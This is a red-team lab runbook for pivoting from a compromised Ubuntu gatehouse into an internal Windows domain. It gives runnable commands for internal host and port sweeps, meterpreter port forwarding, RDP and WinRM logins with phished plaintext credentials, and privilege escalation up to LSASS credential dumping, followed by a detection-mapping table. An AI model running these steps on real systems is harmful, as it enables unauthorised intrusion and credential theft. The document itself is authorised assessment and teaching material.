# Phase 6 — Keys of the Gods (Pivot + Lateral Movement)

> ISOLATED LAB ONLY. Authorised assessment. Host-only network.

Runbook for moving from the gatehouse foothold into the internal network and
escalating. Chosen approach: **meterpreter `portfwd`** for the pivot (runs over the
existing C2 session from Phase 5 — no SSH credential needed) + **RDP as `persephone`**
for lateral access.

## Where we start

```
Kali (attacker)
  │  foothold: meterpreter session on the gatehouse
  │  (Phase 5: apache_normalize_path_rce -> linux/x64/meterpreter/reverse_tcp)
  ▼
Gatehouse 10.1.1.10  (Ubuntu, DUAL-HOMED: DMZ 10.1.1.x + internal 192.168.1.x)
  ▼
Internal 192.168.1.0/24
  - DC            192.168.1.100   (hades.underworld)
  - Workstation   192.168.1.103   (domain-joined, Blue Team / victim)
  - Splunk        192.168.1.6
```

AD creds (from phishing `persephone`): `persephone / Demeter01!` — **normal** domain
user, authorised for RDP on .103. Other wardens share `Ferryman1!`: `charon`,
`cerberus`, `minos`, `hades`. No warden is a domain admin → escalation is local on the
workstation (or promote `hades` to Domain Admin later).

> **Why `portfwd`, not `ssh -D`.** Phase 5 lands a **meterpreter** session, not an SSH
> login, so we tunnel over the C2 we already have — no need to find or crack an SSH
> credential on the gatehouse. It is also quieter there: no `auth.log` login line, just
> the existing session (see `docs/blue-team-detection.md` §6).

---

## Step 1 — Stand up + domain-join the Windows workstation (.103)  (VM console / noVNC)

Do this at the VM console, not over the pivot.

1. Build a Windows 10/11 VM on the **internal** vSwitch (192.168.1.0/24).
2. Point DNS at the DC (required for domain discovery) and set the static IP:
   ```powershell
   Set-DnsClientServerAddress -InterfaceAlias "Ethernet" -ServerAddresses 192.168.1.100
   New-NetIPAddress -InterfaceAlias "Ethernet" -IPAddress 192.168.1.103 -PrefixLength 24 -DefaultGateway 192.168.1.1
   ```
3. Join the domain (use an account allowed to join, e.g. `hades`):
   ```powershell
   Add-Computer -DomainName "hades.underworld" -Credential (Get-Credential) -Restart
   ```
4. After reboot, log in once as `HADES\persephone` so the user profile is created.
5. Enable RDP and authorise `persephone`:
   ```powershell
   Set-ItemProperty 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name fDenyTSConnections -Value 0
   Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
   Add-LocalGroupMember -Group "Remote Desktop Users" -Member "HADES\persephone"
   ```
> **Gotcha:** if the network profile is **Public**, the firewall drops the pivot's
> traffic to `filtered`. Fix it:
> `Set-NetConnectionProfile -InterfaceAlias "Ethernet" -NetworkCategory Private`.

## Step 2 — Internal recon from the foothold  (meterpreter -> `shell` on the gatehouse)

A full nmap sweep of the `/24` as an unprivileged connect scan takes ~1h — too slow.
**Primary method is a fast ping sweep:**

```bash
for i in $(seq 1 254); do ping -c 1 -W 1 192.168.1.$i | grep "bytes from"; done
```
Runs unprivileged. **Caveat:** Windows Defender Firewall drops ICMP echo by default, so
live Windows hosts may not answer. If the sweep is thin, confirm with a TCP sweep to
ports that *do* answer:

```bash
for i in $(seq 1 254); do for p in 445 3389; do (timeout 1 bash -c "echo > /dev/tcp/192.168.1.$i/$p" 2>/dev/null && echo "192.168.1.$i:$p") & done; done; wait
```
Then run nmap only against the confirmed live hosts (fast — two targets, not 254):

```bash
nmap -Pn -sV -p- --open -T4 192.168.1.100,192.168.1.103   # DC + workstation
```
Confirm the DC (88/389/445), the workstation (.103, 3389 open) and Splunk (.6).

## Step 3 — Pivot: forward RDP over the meterpreter session (`portfwd`)

In the meterpreter session on the gatehouse, forward the workstation's RDP port to a
local port on Kali:

```
meterpreter > portfwd add -l 13389 -p 3389 -r 192.168.1.103
```
- `-l 13389` — local listener opened on **Kali** (127.0.0.1:13389)
- `-p 3389`  — the remote port (RDP on the workstation)
- `-r 192.168.1.103` — the workstation, reachable only from the dual-homed gatehouse

Traffic path:
```
Kali (xfreerdp3 -> 127.0.0.1:13389)
   │   meterpreter tunnel (existing C2 session)
   ▼
Gatehouse 10.1.1.10 ── internal leg ──► Windows .103 : 3389 (RDP)
```
Manage forwards with `portfwd list` and
`portfwd delete -l 13389 -p 3389 -r 192.168.1.103`.

## Step 4 — RDP lateral as `persephone`

Point the RDP client at **your own Kali** (the local forward), not at the workstation IP:

```bash
xfreerdp3 /u:persephone /d:hades.underworld /p:'Demeter01!' \
  /v:127.0.0.1:13389 /cert:ignore +clipboard /dynamic-resolution
```
(On Kali the binary is `xfreerdp3`, FreeRDP v3. WinRM alternative while you have the
cred, if 5985 is forwarded the same way with another `portfwd add -l 15985 -p 5985 -r 192.168.1.103`:
`evil-winrm -i 127.0.0.1 -P 15985 -u persephone -p 'Demeter01!'`.)

## Step 5 — Local privilege escalation on the workstation

As `persephone` (normal user), enumerate then escalate:

```powershell
whoami /priv ; whoami /groups
systeminfo
# quick wins
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
- Run **winPEAS** for unquoted service paths, writable service binaries, scheduled
  tasks, stored creds.
- If `SeImpersonatePrivilege` is present → PrintSpoofer / GodPotato.
- Once local admin → dump cached creds (LSASS/mimikatz) and move toward the DC with the
  `hades` credential via PsExec/WinRM.

## Step 6 — Blue team / Splunk detection mapping

> Full map (Sysmon-for-Linux + Windows + pfSense + SPL): **`docs/blue-team-detection.md`**.

The assessment asks you to assess defensive controls. Document what each technique
generates (Windows Security log → Splunk 192.168.1.6):

| Technique | Event / log | Where to see it |
|---|---|---|
| Domain join | 4741 (computer acct created), 4624 | DC security log |
| RDP logon (persephone) | **4624 Logon Type 10** (RemoteInteractive), 4778 | Workstation .103 |
| Failed RDP | 4625 Type 10 | Workstation .103 |
| `portfwd` pivot (RDP) | meterpreter C2 session + gatehouse -> `192.168.1.103:3389` (Sysmon-for-Linux EID 3) | Gatehouse / pfSense |
| Internal ping / TCP sweep | connection spikes, pfSense cross-zone logs | pfSense / Splunk |
| winPEAS / mimikatz | 4688 proc creation; Sysmon EID 1; LSASS access Sysmon EID 10 | Workstation .103 |

**Source IP of the 4624 Type 10** on .103 = the internal IP of the **gatehouse** (the
hop exits the Ubuntu via `portfwd`), not Kali → a workstation receiving RDP from a DMZ
server is a strong anomaly.

Example SPL: `index=* EventCode=4624 Logon_Type=10` catches the RDP lateral move.
